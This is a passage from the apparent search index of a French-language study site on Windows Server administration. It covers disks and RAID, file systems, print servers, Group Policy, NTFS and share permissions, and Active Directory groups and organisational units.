s'assurant que le disque ne contiennent pas de donn\u00e9es</p>"},{"location":"Windows/Serveur/administration_windows/#types-de-configuration-des-disques","title":"Types de configuration des disques","text":"<p>Il existe 2 types de configurations des disques  </p> Configuration de baseConfiguration Dynamique <ul> <li>Simplifie la gestion du disque</li> <li>Toutes les donn\u00e9es sont inscrites dans des partitions</li> <li>Sur un seul disque physique<ul> <li>Partition C: \u2192 Syst\u00e8me</li> <li>Partition D: \u2192 Donn\u00e9es</li> </ul> </li> </ul> <ul> <li>Gestion faite par ensemble de disques</li> <li>Les donn\u00e9es sont inscrites dans des volumes</li> <li>N\u00e9cessaire pour le RAID logiciel  </li> </ul> <p></p> Conversion Base \u2192 DynamiqueConversion Dynamique \u2192 Base <p>Sans incidence pour les donn\u00e9es</p> <p>N\u00e9cessite la suppression pr\u00e9alable des volumes</p>"},{"location":"Windows/Serveur/administration_windows/#partitionnement-et-raid","title":"Partitionnement et RAID","text":""},{"location":"Windows/Serveur/administration_windows/#disque-de-base","title":"Disque de Base","text":"<p>Sur un disque de base, on peut cr\u00e9er au maximum soit :  </p> <ul> <li>4 partitions principales</li> <li>3 partitions principales et 1 partition \u00e9tendue pouvant contenir des lecteurs logique</li> <li>Les lecteurs logiques seront format\u00e9s et il sera impossible d'installer un syst\u00e8me d'exploitation sur ces lecteurs logiques</li> </ul> <p>Les partitions peuvent \u00eatre \u00e9tendues ou r\u00e9duites sur l'espace contigu du m\u00eame disque. Le lancement d'un OS \u00e0 partir d'un lecteur logique n'est pas possible !  </p>"},{"location":"Windows/Serveur/administration_windows/#disque-dynamique","title":"Disque Dynamique","text":"<p>Il est compos\u00e9 de volumes qui peuvent \u00eatre de plusieurs type: - Volume Simple - Volume Fractionn\u00e9 - Volume agr\u00e9g\u00e9 par bandes - Volume en miroir - Volume agr\u00e9g\u00e9 par bandes de parit\u00e9</p> <p>Nous parlerons pour ces volumes de RAID (Redundancy Array of Inexpensive Disk)  </p>"},{"location":"Windows/Serveur/administration_windows/#volume-simple","title":"Volume Simple","text":"<p>On parlera d'espace de disque.  </p> <p>Il s'agit du seul type de volume qui utilise un seul disque physique.  </p> <p></p> <p>Il peut \u00eatre \u00e9tendu au sein du m\u00eame disque  </p> <p></p>"},{"location":"Windows/Serveur/administration_windows/#volume-fractionne","title":"Volume Fractionn\u00e9","text":"<p>Un volume fractionn\u00e9 utilise plusieurs espaces sur plusieurs disques physiques. Pour le mettre en place il faudra au minimum 2 disques.  </p> <p>Situation Initiale : 2 disques install\u00e9s, Seulement 1 d'utilis\u00e9 </p> <p>Extension du volume simple 2 sur le disque dynamique 2 </p>"},{"location":"Windows/Serveur/administration_windows/#raid-0-volume-agrege-par-bandes","title":"RAID-0 - Volume agr\u00e9g\u00e9 par bandes","text":"<p>Aucune tol\u00e9rance de panne !</p> <ul> <li>La taille des bandes doit \u00eatre identique sur chaque disque  </li> <li>R\u00e9parti sur 2 \u00e0 \"x\" disques  </li> <li>Rapidit\u00e9 d\u00e9criture accrue</li> <li>Tout l'espace disque allou\u00e9 est utilisable<ul> <li>Volume utile = Nombre de disque totale</li> <li>Pour 2 disques de 200Go, on aurait 400Go de volume utile</li> </ul> </li> </ul> <p></p>"},{"location":"Windows/Serveur/administration_windows/#raid-1-volume-en-miroir","title":"RAID-1 - Volume en miroir","text":"<p>Tol\u00e9rance aux pannes accrues Un des disques peut-\u00eatre perdu sans impact sur les donn\u00e9es</p> <ul> <li>R\u00e9parti sur 2 disques</li> <li>L'espace allou\u00e9 sur les 2 disques doit \u00eatre identique</li> <li>Les m\u00eames donn\u00e9es sont \u00e9crites simultan\u00e9ment sur les 2 disques</li> <li>La moiti\u00e9 de l'espace disque allou\u00e9 n'est pas directement utilisable<ul> <li>Volume utile = Nombre de disque / 2</li> <li>Pour 2 disques de 200Go, on aurait 200Go de volume utile</li> </ul> </li> </ul> <p></p>"},{"location":"Windows/Serveur/administration_windows/#raid-5-volume-agrege-par-bandes-avec-parite","title":"RAID-5 - Volume agr\u00e9g\u00e9 par bandes avec parit\u00e9","text":"<p>Tol\u00e9rance de panne d'un seul disque</p> <ul> <li>3 disques minimum</li> <li>1 disque (espace d'une bande) est allou\u00e9 \u00e0 la tol\u00e9rance de panne<ul> <li>Volume utile = Nombre de disque -1 x capacit\u00e9 d'un disque</li> <li>Pour 3 disques de 200Go, on aurait 3-1 x 200 = 400Go de volume utile</li> </ul> </li> <li>Bon compromis tol\u00e9rance panne/co\u00fbts</li> </ul> <p></p>"},{"location":"Windows/Serveur/administration_windows/#formatage","title":"Formatage","text":"<p>Premi\u00e8rement les disques doivent \u00eatre initialis\u00e9 et en ligne pour pouvoir \u00eatre format\u00e9. Les partitions principales, lecteurs logiques et volumes  doivent \u00eatre format\u00e9s pour \u00eatre utilisables.  </p> <p>Le formatage est l'installation d'un syst\u00e8me de fichier (h\u00e9bergement de donn\u00e9es).  </p> <p>Les syst\u00e8mes de fichiers disponibles sont : - FAT32 - Depuis windows 9x   - Taille max de fichier = 4Go   - Taille max de partition = 2To - NTFS - Depuis windows NT (norma actuelle pour la plupart des syst\u00e8mes)   - Taille max fichier et partition = 256To - ReFS - Depuis Windows 2012 (pour les espaces de stockage)</p> <p></p>"},{"location":"Windows/Serveur/administration_windows/#les-outils","title":"Les outils","text":"<p>Les outils permettant la gestion des disques et le formatage sont :  </p> La console de gestion des disquesLa commande diskpart utilisable en cmdLes commandes PowerShell <p>diskmgmt.msc via Win+R - console mmc\" </p> <p> </p> <p> </p>"},{"location":"Windows/Serveur/Impression/service_impression/","title":"Gestion des impressions","text":""},{"location":"Windows/Serveur/Impression/service_impression/#le-service-dimpression","title":"Le service d'impression","text":"<p>Les imprimantes sont des ressources g\u00e9n\u00e9ralement raccord\u00e9es au r\u00e9seau de l'entreprises.  </p> <p></p> <p>L'ajout du service de r\u00f4le Serveur d'impression permet de partager des imprimantes, de centraliser et de simplifier la gestion de l'impression.  </p> <p></p>"},{"location":"Windows/Serveur/Impression/service_impression/#point-de-vocabulaire","title":"Point de Vocabulaire","text":"<ul> <li>Port d'impression : Lien permettant la communication entre le p\u00e9riph\u00e9rique d'impression et le serveur (ou \u00e0 un poste client)</li> <li>File d'attente : Liste des documents en attente de traitement par l'imprimante</li> <li>Imprimante locale : Imprimante directement (physiquement) connect\u00e9e \u00e0 un serveur ou \u00e0 un poste client</li> <li>Imprimante partag\u00e9e : Imprimante accessible sur le r\u00e9seau<ul> <li>Elle peut \u00eatre du type imprimante r\u00e9seau</li> <li>Elle peut \u00eatre du type imprimante locale mais raccord\u00e9e a un poste ou un serveur qui la partage (celui-ci devrat etre allum\u00e9 pour qu'elle soit accessible)</li> </ul> </li> <li>Imprimante r\u00e9seau : Imprimante ind\u00e9pendante qui poss\u00e8de sa propre carte r\u00e9seau, disposant d'un \u00e9cran et/ou d'un serveur web embarqu\u00e9 permettant l'administration \u00e0 distance</li> </ul>"},{"location":"Windows/Serveur/Impression/service_impression/#la-gestion-des-impressions","title":"La gestion des impressions","text":""},{"location":"Windows/Serveur/Impression/service_impression/#les-taches-de-gestion-et-outils","title":"Les t\u00e2ches de gestion et outils","text":"<p>L'ajout du service de r\u00f4le Serveur d'impression fournit la console de gestion Gestionnaire d'impression. Cette console rassemble les composants n\u00e9cessaire :  </p> <p></p>"},{"location":"Windows/Serveur/Impression/service_impression/#la-gestion-des-peripheriques","title":"La gestion des p\u00e9riph\u00e9riques","text":"<p>Comme pour des ressources disque, une imprimante doit \u00eatre partag\u00e9e pour \u00eatre accessible via le r\u00e9seau. L'attribution des privil\u00e8ges se configure depuis les param\u00e8tres de s\u00e9curit\u00e9 :  </p> <p></p>"},{"location":"Windows/Serveur/Impression/service_impression/#la-gestion-du-deploiement","title":"La gestion du d\u00e9ploiement","text":"<p>Plusieurs m\u00e9thodes peuvent \u00eatre utilis\u00e9es pour d\u00e9ployer les imprimantes.  </p> <ul> <li>Le d\u00e9ploiement manuel : l'utilisateur va taper sur l'explorateur, l'ad du serveur sur lequel est install\u00e9 le role impression, double clic sur l'imprimante pour l'installer.</li> <li>L'utilisation de scripts : automatise l'installtion et simplifie l'utilisation</li> <li>Le d\u00e9ploiement par strat\u00e9gies de groupe : Si un utilisateur est renseign\u00e9 dans une UO, il aura l'imprimante correspondant \u00e0 son groupe</li> </ul>"},{"location":"Windows/Serveur/Impression/service_impression/#deploiement-par-gpo","title":"D\u00e9ploiement par GPO","text":"<p>Depuis le Gestionnaire d'impression, il est possible de deployer des imprimantes par GPO.  </p> <p>Les informations \u00e0 renseigner seront : </p> <ul> <li>La strat\u00e9gie existante ou nouvelle \u00e0 utiliser</li> <li>Le type d'objet cibl\u00e9 par le d\u00e9ploiement&gt;</li> </ul> <p></p>"},{"location":"Windows/Serveur/active_directory/GPO/","title":"Les Strat\u00e9gies de Groupe","text":""},{"location":"Windows/Serveur/active_directory/GPO/#le-fonctionnement-des-gpo","title":"Le fonctionnement des GPO","text":"<p>Descriptif </p> <p>Les GPO (Group Policy Objetc) ou strat\u00e9gies de groupe sont utilis\u00e9s dans un domaine AD pour param\u00e9trer les ordinateurs et les utilisateurs </p> <p></p>"},{"location":"Windows/Serveur/active_directory/GPO/#les-types-de-strategie","title":"Les types de strat\u00e9gie","text":"<p>Les conditons d'utilisation et d'application varient selon le type de strat\u00e9gie.  </p> <ul> <li>La strat\u00e9gie de groupe : </li> <li>N\u00e9cessite un contexte de domaine.</li> <li>S'applique sur un ou des ensembles d'\u00e9l\u00e9ments</li> <li>En cas de conflits, elle l'emporte sur la strat\u00e9gie locale</li> <li>La strat\u00e9gie locale</li> <li>Est utilisable dans et hors contexte de domaine.</li> <li>Se configure poste par poste</li> </ul>"},{"location":"Windows/Serveur/active_directory/GPO/#du-registre-aux-strategies","title":"Du registre aux strat\u00e9gies","text":"<p>Pour configurer des GPO il existe 2 mani\u00e8re de faire :  </p> <p>Via le registre, mani\u00e8re plus complexe, il oblige de passer syst\u00e9matiquement poste par poste pour les mettres en place. Cependant il n'impactera qu'un poste configur\u00e9 et non un ensemble de poste.  </p> <p>Via la console mmc des strat\u00e9gies de groupe, celle-ci permet d'appliquer des regles sur un ensemble de poste, cela amene un gain de temps.</p>"},{"location":"Windows/Serveur/active_directory/GPO/#application-des-strategies","title":"Application des strat\u00e9gies","text":"<p>C\u00f4t\u00e9 client on parlera d'extensions, de CSE, il s'agit de composants permettant :  </p> <ul> <li>R\u00e9cuperer les strat\u00e9gies mises \u00e0 disposition par le contr\u00f4leur de domaine.</li> <li>Int\u00e8grer et appliquer les param\u00e9trages s'y trouvant</li> </ul>"},{"location":"Windows/Serveur/active_directory/GPO/#strategies-par-defaut","title":"Strat\u00e9gies par d\u00e9faut","text":"<p>Apr\u00e8s l'installation d'un domaine, 2 strat\u00e9gies sont configur\u00e9es par d\u00e9faut :  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/GPO/#le-ciblage-des-strategies","title":"Le Ciblage des strat\u00e9gies","text":"<p>Les GPO ne s'appliquent pas aux membres des groupes pr\u00e9sents sur un conteneur auquel elles sont li\u00e9es. Une GPO ne peut pas \u00eatre appliqu\u00e9e \u00e0 un groupe.  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/GPO/#la-console-de-gestion","title":"La console de gestion","text":"<p>Il s'agit d'une console mmc, ressemblant \u00e0 la console mmc de l'active directory.  </p> <p>Celle-ci comporte : </p> <ul> <li>des **Conteneurs de liaison </li> <li>des Liaisons de strat\u00e9gies : R\u00e9pertorie les strat\u00e9gies et ou elles sont mises en place</li> <li>Conteneur des strat\u00e9gies du domaine : R\u00e9pertorie l'ensemble des strat\u00e9gies de groupe, permettant une visualisation simplifi\u00e9.</li> </ul>"},{"location":"Windows/Serveur/active_directory/GPO/#application-et-ordre-de-traitement","title":"Application et ordre de traitement","text":"Priorit\u00e9s et H\u00e9ritageValeurs Conflictuelles"},{"location":"Windows/Serveur/active_directory/GPO/#les-possibilites-de-restrictions","title":"Les possibilit\u00e9s de restrictions","text":""},{"location":"Windows/Serveur/active_directory/GPO/#la-mise-en-oeuvre-des-strategies","title":"La mise en oeuvre des strat\u00e9gies","text":""},{"location":"Windows/Serveur/active_directory/GPO/#les-domaines-impactes","title":"Les domaines impact\u00e9s","text":"<p>Les domaines impact\u00e9s sont repr\u00e9sent\u00e9s ci-dessous :  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/GPO/#les-modeles-dadministration","title":"Les mod\u00e8les d'administration","text":"<p>Il s'agit de fichier .admx, la plupart des logiciels propri\u00e9taire microsoft dispose de ce type de fichier.  </p> <p>Il permettent de configurer :  </p> <p></p> <ul> <li>Le syst\u00e8me d'exploitation</li> <li>Des composants syst\u00e8me</li> <li>Des outils Microsoft</li> </ul> <p>A noter que les fichiers .admx sont stock\u00e9es dans le partage \"SYSVOL\"</p>"},{"location":"Windows/Serveur/active_directory/GPO/#redirection-des-dossiers","title":"Redirection des dossiers","text":""},{"location":"Windows/Serveur/active_directory/GPO/#principe-de-redirection","title":"Principe de redirection","text":"<p>Les dossiers du profil utilisateur sont stock\u00e9s sur un emplacement r\u00e9seau.  </p> <p></p> <p>Param\u00e8tres du dossier partag\u00e9:</p> <ul> <li>Partage: Contr\u00f4le total pour les utilisateurs redirig\u00e9s.  </li> <li>Permissions NTFS: Liste du dossier et cr\u00e9ation de dossiers dans ce dossier seulement</li> </ul>"},{"location":"Windows/Serveur/active_directory/GPO/#strategie-de-redirection-des-dossiers","title":"Strat\u00e9gie de redirection des dossiers","text":"<p>Les redirections s'appliquent aux objets utilisateurs.  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/","title":"Partage de Ressource","text":"<p>Le partage de ressource est un service n\u00e9cessaire aux utilisateurs Une ressource partag\u00e9e peuvent \u00eatre des dossiers mais \u00e9galement des imprimantes partag\u00e9e. Il s'agit d'un service permettant une utilisation sp\u00e9cifique aux utilisateurs.  </p> <p>leus mise en oeuvre et leurs gestion incombent aux administrateur syst\u00e8me qui doivent respecter les exigences de disponibilit\u00e9s et de s\u00e9curit\u00e9. En effet, ils doivent veiller a ce que les donn\u00e9es critique de l'entreprise ne soient accessible qu'\u00e0 certaines personnes ou groupes autoris\u00e9s. Typiquement des donn\u00e9es RH, ne doivent pas \u00eatre accessible a n'importe qui.  </p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#utilite-des-autorisations-ntfs","title":"Utilit\u00e9 des autorisations NTFS","text":"<p>les autorisations NTFS sont soumises pour l'ensemble des \u00e9l\u00e9ments, tout dossiers ou fichiers d'un volume format\u00e9 y sont soumis. Ces autorisations permettent d'oter ou de mettre en place un certain nombre de priviege d'acces (visible depuis l'onglet s\u00e9curit\u00e9 de l'\u00e9lement).  </p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#caracteristique-des-autorisations-ntfs","title":"Caract\u00e9ristique des autorisations NTFS","text":"<p>Elles offrent 2 niveaux de gestions : </p> <ul> <li>Autorisations de base</li> <li>Autorisations avanc\u00e9es</li> </ul> <p>La gestion des permissions est bas\u00e9e sur des r\u00e8gles explicites. Plusieurs r\u00e8gle d'acc\u00e8s peuvent etre appliquer \u00e0 un m\u00eame utilisateur. Chaque r\u00e8gle peut accorder ou \u00f4ter des privil\u00e8ges. Le m\u00e9canisme d'h\u00e9ritage s'applique aux autorisations positionn\u00e9es sur des dossiers et s'appliquent aux objets enfants. Une r\u00e8gle de refus peut-\u00eatre explicite ou implicite.  </p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#autorisation-de-base-et-avancees","title":"Autorisation de base et avanc\u00e9es","text":""},{"location":"Windows/Serveur/active_directory/acces_ressources/#cumul-dautorisations","title":"Cumul d'autorisations","text":"<p>Chaque autorisation s\u2019applique \u00e0 un objet utilisateur ou groupe de s\u00e9curit\u00e9. Il est cependant pr\u00e9f\u00e9rable de n\u2019appliquer des autorisations qu\u2019aux groupes.  </p> <p>Pour chaque entr\u00e9e de contr\u00f4le d\u2019acc\u00e8s, l\u2019autorisation peut \u00eatre appliqu\u00e9e:  </p> <ul> <li>Autoriser afin d\u2019accorder le privil\u00e8ge correspondant  </li> <li>Refuser afin d\u2019\u00f4ter le privil\u00e8ge correspondant  </li> </ul> <p>\u00c0 d\u00e9faut de r\u00e8gle d\u2019autorisation (explicite) le concernant, l\u2019utilisateur est soumis \u00e0 un refus implicite. Les autorisations sont cumulatives, la r\u00e9sultante des autorisations affectant un utilisateur correspond au cumul des autorisations le concernant. En cas de conflit, le refus l\u2019emporte.  </p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#lheritage-des-autorisations-ntfs","title":"L'h\u00e9ritage des autorisations NTFS","text":"<p>L'h\u00e9ritage s\"applique par d\u00e9faut aux autorisations NTFS positionn\u00e9es sur des dossiers. Il est conseill\u00e9 d'affecter ces autorisations en partant de la racine d'un arborescence afin de b\u00e9n\u00e9ficier de l'h\u00e9ritage et ainsi profit\u00e9 d'une propagation plus rapide et efficace. L'h\u00e9ritage peut \u00eatre rompu sur un point d'arborescence ou repropag\u00e9 \u00e0 partir d'un \u00e9l\u00e9ment.  </p> <p>Il existe n\u00e9anmoins des contraintes :  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#partage-de-fichiers","title":"Partage de fichiers","text":"<p>Le partage vient en compl\u00e9ment des autorisations NTFS  </p> <p>Un poste disposant de partage joue le r\u00f4le de serveur de fichiers, ca peut etre un poste client mais plus g\u00e9n\u00e9ralement il s'agira d'un serveur.  </p> <p>L'utilisateur vas essayer de ce connecter au partage, il passera par l'acc\u00e8s s\u00e9crurit\u00e9 NTFS.  </p> <p></p> <p>Avant d'arriver sur l'aspect s\u00e9curit\u00e9 NTFS, l'utilisateur passera par ...</p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#les-autorisations-de-partage","title":"Les autorisations de partage","text":"<p>Les autorisations permettent de d\u00e9finir :  </p> <ul> <li>Quels seront les privil\u00e8ges</li> <li>S'ils autoriseront ou interdiront l'acc\u00e8s au partage</li> <li>Pour qui ? est-ce que l'utilisateur est autoris\u00e9 \u00e0 y acc\u00e9der</li> </ul> <p>Les 3 types de privil\u00e8ges de partage sont les suivants :  </p> <ul> <li>Lecture</li> <li>Modification</li> <li>Contr\u00f4le Total</li> </ul> <p>Pour chaque niveau, les privil\u00e8ges correspondants pourront \u00eatre :  </p> <ul> <li>Autoris\u00e9</li> <li>Refus\u00e9</li> </ul> <p>Chaque r\u00e8gle cible une ou plusieurs entit\u00e9s. Les r\u00e8gles de contr\u00f4les d'acc\u00e8s sont cumulatives et les refus prioritaires.  </p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#autorisations-resultantes","title":"Autorisations R\u00e9sultantes","text":"<p>Quand l'utilisateur acc\u00e8de depuis son poste de travail \u00e0 une ressource partag\u00e9e :  </p> <ul> <li>Il est d'abord soumis aux autorisations du partage (acces en lecture, modification ou controle total)</li> <li>Puis aux autorisations NTFS (droit de lecture, execution, controle total)</li> </ul> <p></p> <p>Les privil\u00e8ges les plus restrictifs pr\u00e9valent.</p>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#les-publications-de-partage","title":"Les publications de partage","text":"<p>Pour des questions d'administration et de recherche, la publication des partages est indispensable. La publication de partage facilite la recherche pour les utlitisateurs depuis leur poste client avec la fonction Rechercher dans Active Directory</p> <p>Une fois cr\u00e9\u00e9, il est possible de les publier dans l'AD. Une fois publier l'objet Partage est soit li\u00e9 \u00e0 :  </p> <ul> <li>L'objet Ordinateur auquel il est associ\u00e9.</li> <li>Ind\u00e9pendant et peut \u00eatre d\u00e9plac\u00e9 dans une UO d\u00e9di\u00e9.</li> </ul>"},{"location":"Windows/Serveur/active_directory/acces_ressources/#strategie-dimbrication-des-groupes-agdlp","title":"Strat\u00e9gie d'imbrication des groupes AGDLP","text":"<p>Afin de g\u00e9rer efficacement l'acc\u00e8s aux ressources partag\u00e9s, Microsoft pr\u00e9conise l'imbrication des Groupes Globaux et de domaines Locaux.  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/","title":"Base de Gestion d'un Domaine","text":""},{"location":"Windows/Serveur/active_directory/gestion_domaine/#objets-de-lannuaire-et-outils-de-gestion","title":"Objets de l'annuaire et outils de gestion","text":"<p>Dans un contexte de domaine AD, un certain nombre de t\u00e2ches courantes seront effectu\u00e9es, comme l'administration de compte utilisateur, l'administration de conteneur pour nos objets pr\u00e9sent dans l'annuaire.  </p> <p>Les objets sont regroup\u00e9s en 2 familles :  </p> <p></p> <ul> <li>Ordinateurs : ordinateurs clients int\u00e9gr\u00e9s au domaine, mais aussi </li> </ul> <p>La gestion de ces objets peut \u00eatre faite :  </p> <ul> <li>Depuis la console Utilisateurs et ordinateurs Active Directory (console mmc)</li> <li>Depuis le Centre d'administration Active Directory</li> <li>En Powershell</li> </ul>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#objet-utilisateur","title":"Objet Utilisateur","text":""},{"location":"Windows/Serveur/active_directory/gestion_domaine/#caracteristique-utilisateur","title":"Caract\u00e9ristique Utilisateur","text":"<p>Dans un contexte AD \u00e0 la cr\u00e9ation d'un utilisateur, un certain nombre de propri\u00e9t\u00e9 seront disponible pour l'objet utilisateur. Ces propri\u00e9t\u00e9s sont regroup\u00e9s en plusieurs famille.  </p> <p></p> <p>Elles sont relatives :  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#modeles-utilisateurs","title":"Mod\u00e8les Utilisateurs","text":"<p>Selon les recommandations Microsoft, il est conseill\u00e9 d'utiliser des mod\u00e8les de comptes pour simplifier la cr\u00e9ation de nouveaux comptes utilisateurs. Il s'agit de compte g\u00e9n\u00e9rique, Il est conseill\u00e9 de leurs donner des noms clair (ex. Modele_utilisateur), Ils doivent comporter de nombreuses caract\u00e9ristiques afin d'eviter de le refaire manuellement \u00e0 l'entr\u00e9e de nouveau entrant, ils doivent \u00eatre desactiv\u00e9 afin d'eviter les mauvaise manipulation.  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#profil-utilisateur","title":"Profil Utilisateur","text":"<p>Par d\u00e9faut, les utilisateurs du domaine seront sauvegard\u00e9 dans l'active directory et stock\u00e9 au m\u00eame endroit pour l'ensemble des utilisateurs qui ouvriront une session sur des ordinateurs du domaine.  </p> <p>Un utilisateur AD possede :  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#profil-itinerant","title":"Profil Itin\u00e9rant","text":"<p>Ils sont principalement utilis\u00e9 quand les utilisateur on des besoin d'acc\u00e8s \u00e0 leurs profil depuis n'importe quel ordinateur. Ils ne disposent pas de poste r\u00e9f\u00e9rent, ils doivent ce connecter a differente machine au sein de l'entreprise.  </p> <ul> <li>Le profil est copi\u00e9 du partage vers l'ordinateur  </li> <li> <p>synchronisation du profil \u00e0 chaque fermeture de session  </p> <ol> <li>Le profil est charg\u00e9 sur l'ordinateur, cela induit que le profil de chaque utilisateur, disposant un profil itin\u00e9rant, sera stock\u00e9 sur un serveur de l'entreprise, situ\u00e9 dans le domaine</li> <li>L'utilisateur pourra travaill\u00e9, sur n'importe quelle pc avec son environnement qu'il avait sur une autre machine</li> <li>A la fermeture de session, le profil est synchronis\u00e9 sur le serveur</li> </ol> </li> </ul>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#objet-ordinateur","title":"Objet Ordinateur","text":"<p>Dans un contexte AD, les membres s'authentifient afin de disposer d'un jeton d'acc\u00e8s permettant l'acc\u00e8s aux ressources du domaine. Ce processus est commun aux utilisateurs et aux ordinateurs. Voila pourquoi les ordinateurs doivent, eux aussi, disposer d'un compte dans le domaine.  </p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#caracteristique-ordinateur","title":"Caract\u00e9ristique Ordinateur","text":"<p>Comme l'objet Utilisateur, l'objet ordinateur dispose de caract\u00e9ristiques qui lui sont propres.  </p> <p></p> <p>Parmi les caract\u00e9ristiques, le nom et la description sont peut-\u00eatre les plus importantes. Un bon nommage et une bonne description permet une meilleure administration de l'AD et donc du parc informatique. C'est \u00e9galement dans les propri\u00e9t\u00e9s de l'objet ordinateur que les groupes auquel il appartient seront mentionn\u00e9.  </p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#les-groupes","title":"Les Groupes","text":"<p>Un groupe permet de regrouper plusieurs objets au sein d'un m\u00eame objet.  </p> <p>Les groupes permettent de simplifier les listes d'autorisations sur les r\u00e9pertoires mais ils permettent \u00e9galement de simplifier l'administration, ex. Si un utilisateur change de service il suffira de changer l'appartenance au groupe et non de passer sur chaque partage pour changer ses autorisations.  </p> <p>Il existe diff\u00e9rent type de groupe et diff\u00e9rentes \u00e9tendues de groupe.  </p> <p></p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#letendue-du-groupe","title":"l'\u00e9tendue du groupe","text":"<p>Les \u00e9tendues sont d\u00e9pendantes du niveau de la for\u00eat et du domaine. En effet cr\u00e9e des groupes \u00e0 \u00e9tendue universelle si aucun autre domaine ou aucune autre for\u00eat n'est pr\u00e9sente n'as pas franchement d'interet.  </p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#domaine-local","title":"Domaine local","text":"<p>Un groupe disposant d'une \u00e9tendue \"domaine local\" peut-\u00eatre utilis\u00e9 uniquement dans le domaine dans lequel il est cr\u00e9\u00e9. Il peut \u00eatre d\u00e9fini pour contr\u00f4ler l'acc\u00e8s aux ressources uniquement au niveau du domaine local.  </p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#globale","title":"Globale","text":"<p>Un groupe disposant d'une \u00e9tendue \"globale\" pourra \u00eatre utilis\u00e9 dans le domaine local, mais \u00e9galement dans tous les domaines approuv\u00e9s par le domaine de base. Un groupe global pourra contenir d'autre objets du domaine, et \u00eatre utilis\u00e9 pour contr\u00f4ler l'acc\u00e8s aux ressources sur le domaine local et tous les domaines approuv\u00e9s.  </p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#universelle","title":"Universelle","text":"<p>Un groupe disposant de l'\u00e9tendue \"Universelle\" aura une port\u00e9e sur l'ensemble de la for\u00eat. Un groupe universel peut contenir des groupes et objets de n'importe quel domaine de la for\u00eat. Il est possible de l'utiliser pour consolider plusieurs groupes devant avoir une port\u00e9e sur l'ensemble du syst\u00e8me. Ce groupe est d\u00e9fini au sein d'un catalogue global.  </p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#type-du-groupe","title":"Type du Groupe","text":""},{"location":"Windows/Serveur/active_directory/gestion_domaine/#securite","title":"S\u00e9curit\u00e9","text":"<p>Il s'agit des plus utilis\u00e9s et les plus manipul\u00e9s, ils permettent d'utiliser les groupes pour g\u00e9rer les autorisations d'acc\u00e8s aux ressources.  </p> <p>Ces groupes sont utilis\u00e9s pour le contr\u00f4le d'acc\u00e8s, ce qui implique que chaque groupe de ce type dispose d'un identifiant \"SID\"</p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#distribution","title":"Distribution","text":"<p>L'objectif de ce groupe est principalement de faire des listes de distribution, par ex. cr\u00e9er une liste de distribution d'e-mail en ajoutant des contacts.  </p> <p>N'ayant aucune notion de s\u00e9curit\u00e9, ce type de groupe ne dispose pas de \"SID\"  </p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#les-conteneurs-systeme","title":"Les conteneurs syst\u00e8me","text":"<p>A la cr\u00e9ation d'un domaine, diff\u00e9rents objets par d\u00e9faut sont pr\u00e9sent. Parmi eux :  </p> <ul> <li>\"Built-in\" : Element pr\u00e9sent dans la base SAM des CD avant leurs promotion. Une fois la promotion faite, ces derniers sont d\u00e9plac\u00e9s dans ce conteneur                Ce sont des groupes permettant d'assigner des autorisations d'administration de fa\u00e7on g\u00e9n\u00e9ral ou pr\u00e9cises afin de g\u00e9rer la s\u00e9curit\u00e9.                Leur \u00e9tendue est toujours de type local.  </li> <li>Computers : Emplacement de stockage par d\u00e9faut des comptes ordinateurs</li> <li>System : Emplacement de stockage des \u00e9l\u00e9ments n\u00e9cessaires aux fonctionnement de l'AD et aux composants associ\u00e9s.</li> <li>Users : Emplacement de stockage des groupes et utilisateurs existant par d\u00e9faut dans un AD</li> </ul> <p>Il n'est pas conseill\u00e9 de conserver les comptes ordinateur et utilisateur dans les conteneurs Computer &amp; users</p>"},{"location":"Windows/Serveur/active_directory/gestion_domaine/#les-uo-unites-dorganisation","title":"Les UO (Unit\u00e9s d'Organisation)","text":"<p>Les UO permettent de grouper les objets suivant les besoins. Une UO est un groupe d'objets, similaire \u00e0 un dossier, contenant des fichiers. Il s'agit en r\u00e9alit\u00e9 d'un conteneur o\u00f9 l'on va placer des objets.  </p> <p>Les UO vont aider \u00e0 repr\u00e9senter la structure de l'entreprise.  </p> <p>Elles vont regrouper des utilisateurs et/ou des ordinateurs en fonction de leur zone g\u00e9ographique, leur service, leur fonction, etc.  </p> <p>L'\u00e9laboration d'une structure organisationnelle doit prendre en compte les points suivants :  </p> <ul> <li>Les GPO Group Policy Object (strat\u00e9gie de groupe)</li> <li>Les d\u00e9l\u00e9gations administratives</li> <li>L'organisation des objets dans l'arborescence</li> </ul> <p>A noter qu'il est impossible de d\u00e9doubler un objet, il peut \u00eatre copi\u00e9 !</p> <p>Sur les CD, les UO sont prot\u00e9g\u00e9es contre toute suppression accidentelle !</p>"},{"location":"Windows/Serveur/active_directory/notion/","title":"Notion","text":""},{"location":"Windows/Serveur/active_directory/notion/#active-directory","title":"Active Directory","text":"<p>L'Active Directory, service propri\u00e9taire Microsoft\u00a9, est un annuaire LDAP (Lightweight Directory Protocol Access) pour les syst\u00e8mes d'exploitation Windows.  </p> <p>Ce protocole permet de d\u00e9finir la m\u00e9thode utilis\u00e9e pour l'interrogation de la base de donn\u00e9es permettant aux utilisateurs de ce connecter/deconnecter au sein du Domaine.  </p> 